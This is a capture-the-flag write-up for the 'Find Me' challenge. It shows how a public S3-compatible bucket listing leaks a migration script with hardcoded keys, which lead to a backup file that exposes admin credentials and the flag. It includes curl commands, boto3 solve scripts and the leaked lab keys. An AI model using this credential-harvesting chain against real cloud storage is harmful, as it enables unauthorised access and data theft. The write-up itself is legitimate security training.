---
title: Find Me
date: 2026-06-28
tags:
- misc
- MntcrlCTF-2026
---

- **Challenge:** Find Me
- **Category:** Misc
- **Flag:** `mntcrl{m1gr4t10n_l34k_t0_4dm1n}`

---

## My initial read / first impressions

We are given a website and the challenge description says:

```text
They gave me access to this site, saying they have everything exposed, but other than praising the sun, I don’t know what I can find.
```

Opening the site just shows a random Italian page praising the sun. At first it looks like a static website with nothing useful on it.

The page source was also mostly just normal HTML, but one line immediately looked suspicious:

```html
<link rel="stylesheet" href="http://localhost:8080/find-me/static/style.css" />
```

This is weird because the stylesheet is being loaded from `localhost:8080`.

Obviously, from my browser, `localhost` would mean my own computer, not the challenge server. So this seemed like a leaked internal URL from the actual backend setup.

The important part was:

```text
/find-me
```

So I started looking at the site like it was some kind of exposed static bucket or object storage setup.

## Finding the bucket

I first tried some normal web stuff, but when I requested a path that did not exist, the response was way more useful than a normal 404.

```bash
BASE='https://find-me-8794f5396ff4.c.mntcrl.it'

curl -sk -i "$BASE/find-me/actuator" | head -80
```

This returned:

```xml
HTTP/1.1 404 Not Found
Content-Type: application/xml
Server: nginx/1.27.5
X-Amz-Id-2: ...
X-Amz-Request-Id: ...

<?xml version='1.0' encoding='utf-8'?>
<Error>
  <Code>NoSuchKey</Code>
  <Message>The specified key does not exist.</Message>
  <Key>actuator</Key>
</Error>
```

The important parts are:

```text
X-Amz-Id-2
X-Amz-Request-Id
NoSuchKey
```

That is very S3-like. So the website was probably being served through an S3-compatible backend, maybe LocalStack or MinIO.

Also, the response said:

```xml
<Key>actuator</Key>
```

even though I requested:

```text
/find-me/actuator
```

So nginx was probably stripping `/find-me/` and passing the rest as the object key.

That meant the bucket root was probably exposed at:

```text
/find-me/
```

So I tried S3 bucket listing.

```bash
curl -sk "$BASE/find-me/?list-type=2"
```

And that worked.

The response contained:

```xml
<ListBucketResult>
  <Name>find-me</Name>
  <KeyCount>5</KeyCount>

  <Contents>
    <Key>admin/flag.txt</Key>
  </Contents>

  <Contents>
    <Key>backup/migration-backup.xml</Key>
  </Contents>

  <Contents>
    <Key>index.html</Key>
  </Contents>

  <Contents>
    <Key>migration/migration.ps1</Key>
  </Contents>

  <Contents>
    <Key>static/style.css</Key>
  </Contents>
</ListBucketResult>
```

So the bucket listing was completely public.

At this point I could see the flag path:

```text
admin/flag.txt
```

So I tried the obvious thing.

```bash
curl -sk "$BASE/find-me/admin/flag.txt"
```

But it returned:

```html
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.27.5</center>
</body>
</html>
```

So listing was public, but direct access to the `admin/` prefix was blocked.

## Reading the exposed migration files

The interesting objects were:

```text
migration/migration.ps1
backup/migration-backup.xml
```

The backup XML was blocked anonymously, but the PowerShell migration script was readable.

```bash
curl -sk "$BASE/find-me/migration/migration.ps1"
```

Inside it, there were hardcoded S3 credentials:

```powershell
param(
    [string]$EndpointUrl = "http://localhost:8080",
    [string]$BucketName = "find-me",
    [string]$AwsRegion = "eu-west-1",
    [string]$DumpDir = "./dump",
    [string]$AccessKeyId = "LKIAQAAAAAAADIPJRMZY",
    [string]$SecretAccessKey = "7N2tJpXA4lRiXW42A/NhaIrF5xBMYuL5z6BEjyDe"
)
```

The script also made it obvious what this user could access:

```powershell
aws --endpoint-url $EndpointUrl s3 ls "s3://$BucketName/migration/" --recursive

aws --endpoint-url $EndpointUrl s3 ls "s3://$BucketName/backup/" --recursive

aws --endpoint-url $EndpointUrl s3 sync "s3://$BucketName/migration/" $MigrationDir --only-show-errors

aws --endpoint-url $EndpointUrl s3 sync "s3://$BucketName/backup/" $BackupDir --only-show-errors
```

So these creds were probably not admin creds. They were migration creds that could read the `migration/` and `backup/` prefixes.

Since I did not have AWS CLI installed, I used `boto3`.

```python
import boto3
from botocore.config import Config
from botocore.exceptions import ClientError

BASE = "https://find-me-8794f5396ff4.c.mntcrl.it"

s3 = boto3.client(
    "s3",
    endpoint_url=BASE,
    region_name="eu-west-1",
    aws_access_key_id="LKIAQAAAAAAADIPJRMZY",
    aws_secret_access_key="7N2tJpXA4lRiXW42A/NhaIrF5xBMYuL5z6BEjyDe",
    config=Config(
        signature_version="s3v4",
        s3={"addressing_style": "path"},
    ),
)

for key in [
    "migration/migration.ps1",
    "backup/migration-backup.xml",
    "admin/flag.txt",
]:
    print(f"\n===== {key} =====")
    try:
        obj = s3.get_object(Bucket="find-me", Key=key)
        data = obj["Body"].read()
        print(data.decode(errors="replace")[:5000])
    except ClientError as e:
        print("ERROR:", e.response["Error"])
```

Running this showed that the migration creds could read the backup XML, but still could not read the flag.

```text
===== migration/migration.ps1 =====
...

===== backup/migration-backup.xml =====
<credentials>
  ...
</credentials>

===== admin/flag.txt =====
ERROR: {'Code': '403', 'Message': 'Forbidden'}
```

So the first leaked credentials were only a stepping stone.

## The real leak

The backup XML had a bunch of fake cloud credentials, but the actually useful part was under the LocalStack users section.

```xml
<users>
  <user name="migration-user">
    <accessKeyId>LKIAQAAAAAAADIPJRMZY</accessKeyId>
    <secretAccessKey>7N2tJpXA4lRiXW42A/NhaIrF5xBMYuL5z6BEjyDe</secretAccessKey>
    <allowedPrefixes>
      <prefix>migration/</prefix>
      <prefix>backup/</prefix>
    </allowedPrefixes>
  </user>
  <user name="admin">
    <accessKeyId>LKIAQAAAAAAAHLQSO46C</accessKeyId>
    <secretAccessKey>//IQPAQo1AIt76P4zxWNJ2CF+ojXLZIIV42+hEi8</secretAccessKey>
    <allowedPrefixes>
      <prefix>admin/</prefix>
    </allowedPrefixes>
  </user>
</users>
```

So the chain was:

1. Public website leaks `/find-me`.
2. S3 bucket listing is public.
3. Listing reveals `migration/migration.ps1`.
4. Migration script leaks migration-user credentials.
5. Migration-user can read `backup/migration-backup.xml`.
6. Backup XML leaks admin credentials.
7. Admin credentials can read `admin/flag.txt`.

The key detail is that the first credentials only allow:

```text
migration/
backup/
```

But the admin credentials allow:

```text
admin/
```

So I just had to swap the boto3 client to use the admin key.

## Final Solve Script

```python
import boto3
from botocore.config import Config

BASE = "https://find-me-8794f5396ff4.c.mntcrl.it"

s3 = boto3.client(
    "s3",
    endpoint_url=BASE,
    region_name="eu-west-1",
    aws_access_key_id="LKIAQAAAAAAAHLQSO46C",
    aws_secret_access_key="//IQPAQo1AIt76P4zxWNJ2CF+ojXLZIIV42+hEi8",
    config=Config(
        signature_version="s3v4",
        s3={"addressing_style": "path"},
    ),
)

obj = s3.get_object(Bucket="find-me", Key="admin/flag.txt")
print(obj["Body"].read().decode())
```

Running it:

```bash
python solve.py
```

Output:

```text
mntcrl{m1gr4t10n_l34k_t0_4dm1n}
```

And that gives the flag.
